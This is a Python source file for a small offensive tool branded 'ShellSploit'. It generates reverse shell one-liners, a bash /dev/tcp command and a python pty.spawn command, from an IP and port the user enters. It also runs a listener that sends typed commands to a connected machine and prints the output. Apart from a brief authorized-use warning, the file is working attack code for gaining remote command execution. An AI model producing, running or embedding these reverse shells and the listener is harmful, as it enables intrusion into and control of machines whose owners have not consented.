import os
import getpass
import socket
from colorama import init, Fore, Back, Style
init(autoreset=True)
legal_warning = Fore.RED + """
************************************************************
* WARNING: This tool is intended for authorized testing    *
* only. Use on systems you own or have explicit permission.*
* Unauthorized use is illegal and may result in criminal   *
* and civil penalties.                                     *
************************************************************
"""

def listen(ip, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip, port))
        server.listen(1)
        print(f"Listening on {ip}:{port}")
    except OSError as e:
        print(f"[!] Failed to start listener: {e}")
        return

    try:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
    except OSError as e:
        print(f"[!] Accept failed: {e}")
        return

    try:
        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                break

            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Listener closed.")

def option_check(choice):
    if choice == "1":
        shell_type = input("Enter shell type (bash, python): ").lower()
        ip = input("Enter your IP: ")
        port = int(input("Enter port: "))

        if shell_type == "bash":
            print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        elif shell_type == "python":
            shell = f"""
            python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
            """
            print(shell)
        else:
            print("[!] Unknown shell type.")
            return
        
    elif choice == "2":
        port = int(input("Enter port to listen on: "))
        listen("0.0.0.0", port)

    else:
        print("[!] Invalid option.")

options_menu = Fore.GREEN + """
Options:
1. Reverse Shell Generator
2. Listener
"""
logo = Fore.MAGENTA + r"""
  ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░      ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░      ░               ░  ░    ░ ░   ░           
                                                                                        
"""

username = getpass.getuser()
print(logo)
print("- Made By GdevMan\n -My GH - https://github.com/GdevMan")
print(legal_warning)
print(options_menu)

def main():
    while True:
        try:
            choice = input(Fore.GREEN + f"[{username}@localhost] ~ $ ")
            option_check(choice)
        except KeyboardInterrupt:
            print("\n[!] User Quit")
            exit()

if __name__ == "__main__":
    main()